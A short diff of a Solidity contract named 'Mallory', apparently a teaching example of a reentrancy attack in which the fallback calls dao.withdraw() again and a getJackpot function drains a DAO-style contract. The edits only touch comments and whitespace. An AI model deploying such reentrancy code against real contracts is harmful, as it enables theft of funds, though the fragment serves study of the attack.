@@ -38,13 +38,13 @@ contract Mallory {
             dao.withdraw();
         }
     }
-    function donate() public {
-        dao.donate(address(this), address(this).balance); //FIX
+    function donate() public {        
+        dao.donate(address(this), address(this).balance);  //should this not be a send(this.balance)? 
     }
     function getJackpot() public {
         dao.withdraw();
     }
     function queryBalance() public view returns (uint) {
-        return address(this).balance; //FIX
+        return address(this).balance; 
     }
 }
